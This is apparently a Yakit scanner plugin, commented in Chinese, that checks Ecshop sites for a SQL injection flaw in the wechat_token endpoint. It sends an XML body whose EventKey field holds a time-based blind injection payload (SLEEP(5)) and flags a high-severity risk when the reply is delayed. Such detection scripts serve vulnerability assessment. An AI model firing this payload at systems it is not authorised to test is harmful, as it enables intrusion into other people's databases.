yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /user.php?act=wechat_token HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
X-Forwarded-For: 127.0.0.1
Referer: http://127.0.0.1

<?xml version="1.0"?>
<user>
    <Event>scan</Event>
    <EventKey>' AND (SELECT 1649 FROM (SELECT(SLEEP(5)))nsIj) AND 'RKvz'='RKvz</EventKey>
    <FromUserName>123456</FromUserName>
</user>`

    // 记录请求开始的时间
    start_time = time.Now()

    // 发送 GET 请求进行 SQL 注入
    rsp, req, _ = poc.HTTP(packet, 
        poc.params({
            "addr": addr
        }), 
        poc.https(isTls), 
        poc.redirectTimes(0)
    )

    // 计算响应时间
    response_time = time.Since(start_time)

    // 判断响应时间是否超过5秒，来检测是否存在SQL注入漏洞
    if response_time.Seconds() > 5 {
        yakit.Info("%v 发现可能的 Ecshop >=v4.1.19 SQL 注入漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("Ecshop >=v4.1.19 SQL 注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("Ecshop >=v4.1.19 SQL 注入漏洞"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve")
        )
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
